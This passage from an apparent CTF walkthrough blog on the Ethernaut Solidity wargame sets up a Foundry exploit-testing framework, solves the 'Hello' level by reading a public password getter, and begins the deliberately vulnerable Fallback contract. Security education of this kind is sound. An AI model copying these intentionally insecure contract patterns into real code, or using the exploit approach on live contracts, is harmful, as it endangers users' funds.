</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>        <span style="color:#728e00">require</span>(<span style="color:#728e00">data</span>.<span style="color:#434f54">player</span> <span style="color:#728e00">==</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#95a5a6">// Not already submitted.
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>        <span style="color:#728e00">require</span>(<span style="color:#728e00">data</span>.<span style="color:#434f54">completed</span> <span style="color:#728e00">==</span> <span style="color:#00979d">false</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#95a5a6">// Have the level check the instance.
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>        <span style="color:#728e00">if</span> (<span style="color:#728e00">data</span>.<span style="color:#434f54">level</span>.<span style="color:#434f54">validateInstance</span>(<span style="color:#434f54">_instance</span>, <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#95a5a6">// Register instance as completed.
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>            <span style="color:#728e00">data</span>.<span style="color:#434f54">completed</span> <span style="color:#728e00">=</span> <span style="color:#00979d">true</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#95a5a6">// Notify success via logs.
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>            <span style="color:#434f54">emit</span> <span style="color:#434f54">LevelCompletedLog</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>, <span style="color:#728e00">data</span>.<span style="color:#434f54">level</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#95a5a6">// Return data - not possible to read emitted events
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>            <span style="color:#728e00">return</span> <span style="color:#00979d">true</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#95a5a6">// Return data - not possible to read emitted events via solidity.
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>        <span style="color:#728e00">return</span> <span style="color:#00979d">false</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It has 2 mappings, 3 functions and emits 2 types of events:</p>
 <div class="mermaid">
<p>%%{init: {&rsquo;theme&rsquo;:&rsquo;neutral&rsquo;}}%%
classDiagram
class Ethernaut {
mapping<del>address =&gt; bool</del> registeredLevels
mapping<del>address =&gt; EmittedInstanceData</del> emittedInstances</p>
<pre><code> +registerLevel(LevelFactory level)
 +createLevelInstance(LevelFactory level) address
 +submitLevelinstance(address payable instance) bool
</code></pre>
<p>}
class EmittedInstanceData {
+address player
+LevelFactory level
+bool completed
}
class LevelInstanceCreatedLog
class LevelCompletedLog
Ethernaut .. EmittedInstanceData
Ethernaut .. LevelInstanceCreatedLog : when new level instance deployed
Ethernaut .. LevelCompletedLog : when player have passed the level</p>
 </div>
<ul>
<li><code>registerLevel</code> &ndash; Registers <code>LevelFactory</code> to be allowed for
generating and validating level instances.</li>
<li><code>createLevelInstance</code> &ndash; Ensures that a given <code>LevelFactory</code>
is registered, deploys a new level instance and stores it&rsquo;s  in
the <code>emittedInstances</code> mapping. It also emits the
<code>LevelInstanceCreatedLog</code> event that can be used to read the
address of deployed instance on the client side.</li>
<li><code>submitLevelInstance</code> &ndash; Checks the given level instance and
emits the <code>LevelCompletedLog</code> event in case of success.</li>
</ul>
<p>Let&rsquo;s keep files for each level in separate directories:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>└── src
</span></span><span style="display:flex;"><span>    ├── game
</span></span><span style="display:flex;"><span>    │   ├── Ethernaut.sol
</span></span><span style="display:flex;"><span>    │   └── LevelFactory.sol
</span></span><span style="display:flex;"><span>    ├── levels
</span></span><span style="display:flex;"><span>    │   ├── Fallback
</span></span><span style="display:flex;"><span>    │   │   ├── Fallback.sol
</span></span><span style="display:flex;"><span>    │   │   └── FallbackFactory.sol
</span></span><span style="display:flex;"><span>    │   └── Hello
</span></span><span style="display:flex;"><span>    │       └── Instance.sol
</span></span><span style="display:flex;"><span>    └── test
</span></span><span style="display:flex;"><span>        ├── Fallback.t.sol
</span></span><span style="display:flex;"><span>        └── common
</span></span><span style="display:flex;"><span>            ├── LevelTest.sol
</span></span><span style="display:flex;"><span>            └── Utils.sol
</span></span></code></pre></div><ul>
<li><code>{Level}.sol</code> &ndash; Contains the main game logic.</li>
<li><code>{Level}Factory.sol</code> &ndash; Extends the <code>LevelFactory.sol</code>
abstract base contract and implements construction and
validation logic for a specific level.</li>
</ul>
<p>We&rsquo;ll keep tests in the <code>./src/test</code> folder and have the naming
convention <code>{Level}.t.sol</code>. Our contracts for testing exploits will follow the
same structure, so it makes sense to have some base contract
which I called <code>LevelTest</code> (the idea is based on the
<a href="https://github.com/StErMi/foundry-ethernaut/blob/main/test/utils/BaseTest.sol"  class="external-link" target="_blank" rel="noopener">BaseTest</a>
by StErMi):</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#95a5a6">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#728e00">^</span><span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">8</span>.<span style="color:#8a7b52">2</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> {<span style="color:#434f54">Test</span>} <span style="color:#728e00">from</span> <span style="color:#7f8c8d">&#34;forge-std/Test.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> {<span style="color:#434f54">Vm</span>} <span style="color:#728e00">from</span> <span style="color:#7f8c8d">&#34;forge-std/Vm.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> {<span style="color:#434f54">Utils</span>} <span style="color:#728e00">from</span> <span style="color:#7f8c8d">&#34;./Utils.sol&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> {<span style="color:#434f54">Ethernaut</span>} <span style="color:#728e00">from</span> <span style="color:#7f8c8d">&#34;../../game/Ethernaut.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> {<span style="color:#434f54">LevelFactory</span>} <span style="color:#728e00">from</span> <span style="color:#7f8c8d">&#34;../../game/LevelFactory.sol&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">abstract</span> <span style="color:#728e00">contract</span> <span style="color:#434f54">LevelTest</span> <span style="color:#728e00">is</span> <span style="color:#434f54">Test</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">Utils</span> <span style="color:#728e00">internal</span> <span style="color:#434f54">utils</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">Ethernaut</span> <span style="color:#728e00">private</span> <span style="color:#434f54">ethernaut</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">LevelFactory</span> <span style="color:#728e00">internal</span> <span style="color:#434f54">levelFactory</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">payable</span> <span style="color:#728e00">internal</span> <span style="color:#434f54">levelAddress</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">payable</span>[] <span style="color:#728e00">internal</span> <span style="color:#434f54">users</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">payable</span> <span style="color:#728e00">internal</span> <span style="color:#434f54">owner</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">payable</span> <span style="color:#728e00">internal</span> <span style="color:#434f54">player</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">setUp</span>() <span style="color:#728e00">public</span> <span style="color:#728e00">virtual</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">require</span>(
</span></span><span style="display:flex;"><span>            <span style="color:#00979d">address</span>(<span style="color:#434f54">levelFactory</span>) <span style="color:#728e00">!=</span> <span style="color:#00979d">address</span>(<span style="color:#8a7b52">0</span>),
</span></span><span style="display:flex;"><span>            <span style="color:#7f8c8d">&#34;levelFactory is not initialized&#34;</span>
</span></span><span style="display:flex;"><span>        );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">utils</span> <span style="color:#728e00">=</span> <span style="color:#728e00">new</span> <span style="color:#434f54">Utils</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">ethernaut</span> <span style="color:#728e00">=</span> <span style="color:#728e00">new</span> <span style="color:#434f54">Ethernaut</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">ethernaut</span>.<span style="color:#434f54">registerLevel</span>(<span style="color:#434f54">levelFactory</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">users</span> <span style="color:#728e00">=</span> <span style="color:#434f54">utils</span>.<span style="color:#434f54">createUsers</span>(<span style="color:#8a7b52">2</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#434f54">users</span>[<span style="color:#8a7b52">0</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">player</span> <span style="color:#728e00">=</span> <span style="color:#434f54">users</span>[<span style="color:#8a7b52">1</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">vm</span>.<span style="color:#434f54">label</span>(<span style="color:#434f54">owner</span>, <span style="color:#7f8c8d">&#34;owner&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">vm</span>.<span style="color:#434f54">label</span>(<span style="color:#434f54">player</span>, <span style="color:#7f8c8d">&#34;player&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">create</span>() <span style="color:#728e00">external</span> <span style="color:#728e00">payable</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">address</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">vm</span>.<span style="color:#434f54">prank</span>(<span style="color:#434f54">player</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">return</span> <span style="color:#434f54">ethernaut</span>.<span style="color:#434f54">createLevelInstance</span>{<span style="color:#728e00">value</span><span style="color:#728e00">:</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>}(<span style="color:#434f54">levelFactory</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">run</span>() <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">init</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">exploit</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">check</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">init</span>() <span style="color:#728e00">internal</span> <span style="color:#728e00">virtual</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">exploit</span>() <span style="color:#728e00">internal</span> <span style="color:#728e00">virtual</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">check</span>() <span style="color:#728e00">internal</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">player</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">bool</span> <span style="color:#434f54">exploited</span> <span style="color:#728e00">=</span> <span style="color:#434f54">ethernaut</span>.<span style="color:#434f54">submitLevelInstance</span>(<span style="color:#434f54">levelAddress</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">assertTrue</span>(<span style="color:#434f54">exploited</span>, <span style="color:#7f8c8d">&#34;Not exploited&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>In the <code>setUp</code> function we:</p>
<ul>
<li>Check that the derived contract has initialized the <code>levelFactory</code>.</li>
<li>Create owner and player test users and assign their labels for
debugging.</li>
</ul>
<p>The <code>Utils</code> helps us setup test users (contract owner and
player) with some initial balance. It contains 4 functions:</p>
<ul>
<li><code>writeTokenBalance</code> &ndash; Modifies the storage of a token to mint
new tokens to an address.</li>
<li><code>getNamedAddress</code> &ndash; Generates an <code>address</code> from the given
name <code>string</code>.</li>
<li><code>createUsers</code> &ndash; Creates a given number of users with default
initial balance.</li>
<li><code>mineBlocks</code> &ndash; Moves <code>block.number</code> forward by a given number of blocks.</li>
<li><code>mineTime</code> &ndash; Moves forward by a given number of seconds.</li>
</ul>
<p>We expect the derived test contact to:</p>
<ol>
<li>Initialize the <code>levelFactory</code> variable in its constructor.</li>
<li>Override the <code>init</code> and <code>exploit</code> functions.</li>
</ol>
<p>Here is how a typical test contract (<code>Foo.t.sol</code>) might look like:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#95a5a6">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#728e00">^</span><span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">8</span>.<span style="color:#8a7b52">2</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> {<span style="color:#434f54">Ethernaut</span>} <span style="color:#728e00">from</span> <span style="color:#7f8c8d">&#34;../game/Ethernaut.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> {<span style="color:#434f54">Foo</span>} <span style="color:#728e00">from</span> <span style="color:#7f8c8d">&#34;../levels/Foo/Foo.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> {<span style="color:#434f54">FooFactory</span>} <span style="color:#728e00">from</span> <span style="color:#7f8c8d">&#34;../levels/Foo/FooFactory.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> {<span style="color:#434f54">LevelTest</span>} <span style="color:#728e00">from</span> <span style="color:#7f8c8d">&#34;./common/LevelTest.sol&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">FooTest</span> <span style="color:#728e00">is</span> <span style="color:#434f54">LevelTest</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">Foo</span> <span style="color:#728e00">private</span> <span style="color:#434f54">level</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#95a5a6">// Initialize level factory
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>        <span style="color:#434f54">levelFactory</span> <span style="color:#728e00">=</span> <span style="color:#728e00">new</span> <span style="color:#434f54">FooFactory</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// This test-prefixed function gets called when we run &#34;forge test&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#728e00">function</span> <span style="color:#d35400">testFoo</span>() <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">run</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">init</span>() <span style="color:#728e00">internal</span> <span style="color:#728e00">override</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#95a5a6">// Our setup code goes here
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">levelAddress</span> <span style="color:#728e00">=</span> <span style="color:#728e00">payable</span>(<span style="color:#728e00">this</span>.<span style="color:#434f54">create</span>());
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">level</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Foo</span>(<span style="color:#434f54">levelAddress</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">assertEq</span>(<span style="color:#434f54">level</span>.<span style="color:#434f54">owner</span>(), <span style="color:#00979d">address</span>(<span style="color:#434f54">levelFactory</span>));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">exploit</span>() <span style="color:#728e00">internal</span> <span style="color:#728e00">override</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">player</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#95a5a6">// Our exploit code goes here
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This is our framework. The
<a href="https://github.com/vyorkin/ethernaut-solutions/tree/step-1"  class="external-link" target="_blank" rel="noopener">step-1</a>
branch reflects the current state of our repository. I&rsquo;ll copy
levels and their factories from the
<a href="https://github.com/OpenZeppelin/ethernaut/tree/master/contracts/contracts/levels"  class="external-link" target="_blank" rel="noopener">ethernaut
repository</a> as we go.</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>First challenge</p>
<p>The first challenge requires us to find a secret password. We
only need browser&rsquo;s console and Metamask to solve it. Let&rsquo;s take
a look at the <code>contract</code>. It has the following methods:</p>
<figure><img src="https://vyorkin.org/ox-hugo/ethernaut-hello1.jpg">
        </figure>

<p>Notice that the <code>authenticate</code> function takes a password and the
contract has the <code>password</code> getter function which returns, well,
a password. All we need to do is to call the <code>authenticate</code>
function with that password string.</p>
<p>Then we can submit the solution:</p>
<figure><img src="https://vyorkin.org/ox-hugo/ethernaut-hello2.jpg">
        </figure>

<p>That&rsquo;s all:</p>
<figure><img src="https://vyorkin.org/ox-hugo/ethernaut-hello3.jpg">
        </figure>

<p>After submitting we get the message on the web page:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Congratulations! You have completed the tutorial. Have a look at
</span></span><span style="display:flex;"><span>the Solidity code for the contract you just interacted with below.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>You are now ready to complete all the levels of the game, and as
</span></span><span style="display:flex;"><span>of now, you&#39;re on your own.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Godspeed!!
</span></span></code></pre></div><p>And the code of the challenge contract:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#95a5a6">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#728e00">^</span><span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">6</span>.<span style="color:#8a7b52">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Instance</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">string</span> <span style="color:#728e00">public</span> <span style="color:#434f54">password</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint8</span> <span style="color:#728e00">public</span> <span style="color:#434f54">infoNum</span> <span style="color:#728e00">=</span> <span style="color:#8a7b52">42</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">string</span> <span style="color:#728e00">public</span> <span style="color:#434f54">theMethodName</span> <span style="color:#728e00">=</span> <span style="color:#7f8c8d">&#34;The method name is method7123949.&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">bool</span> <span style="color:#728e00">private</span> <span style="color:#434f54">cleared</span> <span style="color:#728e00">=</span> <span style="color:#00979d">false</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// constructor
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#728e00">constructor</span>(<span style="color:#00979d">string</span> <span style="color:#728e00">memory</span> <span style="color:#434f54">_password</span>) <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">password</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_password</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">info</span>() <span style="color:#728e00">public</span> <span style="color:#728e00">pure</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">string</span> <span style="color:#728e00">memory</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">return</span> <span style="color:#7f8c8d">&#34;You will find what you need in info1().&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">info1</span>() <span style="color:#728e00">public</span> <span style="color:#728e00">pure</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">string</span> <span style="color:#728e00">memory</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">return</span> <span style="color:#7f8c8d">&#39;Try info2(), but with &#34;hello&#34; as a parameter.&#39;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">info2</span>(<span style="color:#00979d">string</span> <span style="color:#728e00">memory</span> <span style="color:#434f54">param</span>) <span style="color:#728e00">public</span> <span style="color:#728e00">pure</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">string</span> <span style="color:#728e00">memory</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (
</span></span><span style="display:flex;"><span>            <span style="color:#728e00">keccak256</span>(<span style="color:#728e00">abi</span>.<span style="color:#728e00">encodePacked</span>(<span style="color:#434f54">param</span>)) <span style="color:#728e00">==</span>
</span></span><span style="display:flex;"><span>            <span style="color:#728e00">keccak256</span>(<span style="color:#728e00">abi</span>.<span style="color:#728e00">encodePacked</span>(<span style="color:#7f8c8d">&#34;hello&#34;</span>))
</span></span><span style="display:flex;"><span>        ) {
</span></span><span style="display:flex;"><span>            <span style="color:#728e00">return</span>
</span></span><span style="display:flex;"><span>                <span style="color:#7f8c8d">&#34;The property infoNum holds the &#34;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#7f8c8d">&#34;number of the next info method to call.&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">return</span> <span style="color:#7f8c8d">&#34;Wrong parameter.&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">info42</span>() <span style="color:#728e00">public</span> <span style="color:#728e00">pure</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">string</span> <span style="color:#728e00">memory</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">return</span> <span style="color:#7f8c8d">&#34;theMethodName is the name of the next method.&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">method7123949</span>() <span style="color:#728e00">public</span> <span style="color:#728e00">pure</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">string</span> <span style="color:#728e00">memory</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">return</span> <span style="color:#7f8c8d">&#34;If you know the password, submit it to authenticate().&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">authenticate</span>(<span style="color:#00979d">string</span> <span style="color:#728e00">memory</span> <span style="color:#434f54">passkey</span>) <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (
</span></span><span style="display:flex;"><span>            <span style="color:#728e00">keccak256</span>(<span style="color:#728e00">abi</span>.<span style="color:#728e00">encodePacked</span>(<span style="color:#434f54">passkey</span>)) <span style="color:#728e00">==</span>
</span></span><span style="display:flex;"><span>            <span style="color:#728e00">keccak256</span>(<span style="color:#728e00">abi</span>.<span style="color:#728e00">encodePacked</span>(<span style="color:#434f54">password</span>))
</span></span><span style="display:flex;"><span>        ) {
</span></span><span style="display:flex;"><span>            <span style="color:#434f54">cleared</span> <span style="color:#728e00">=</span> <span style="color:#00979d">true</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">getCleared</span>() <span style="color:#728e00">public</span> <span style="color:#728e00">view</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">bool</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">return</span> <span style="color:#434f54">cleared</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>As you can see we&rsquo;ve skipped a lot of hints. We didn&rsquo;t call any
of those <code>infoX</code> functions %)</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>On a final note</p>
<p>Looks like now we&rsquo;re prepared to start hacking the first &ldquo;real&rdquo;
challenge &ndash; <a href="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-2-fallback" >Let&rsquo;s
play CTF, Ethernaut, #2 Fallback</a>. Thanks for reading!</p>
</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo done DONE">DONE</span>  Ethernaut, #2 Fallback</p>
<p>To complete this level we need become the owner of the contract
and reduce its balance to zero.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#95a5a6">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#728e00">^</span><span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">8</span>.<span style="color:#8a7b52">2</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Fallback</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">mapping</span>(<span style="color:#00979d">address</span> <span style="color:#728e00">=&gt;</span> <span style="color:#00979d">uint256</span>) <span style="color:#728e00">public</span> <span style="color:#434f54">contributions</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">payable</span> <span style="color:#728e00">public</span> <span style="color:#434f54">owner</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#728e00">payable</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">contributions</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">=</span> <span style="color:#8a7b52">1000</span> <span style="color:#728e00">*</span> (<span style="color:#8a7b52">1</span> <span style="color:#00979d">ether</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">modifier</span> <span style="color:#d35400">onlyOwner</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">require</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span> <span style="color:#728e00">==</span> <span style="color:#434f54">owner</span>, <span style="color:#7f8c8d">&#34;caller is not the owner&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">_</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
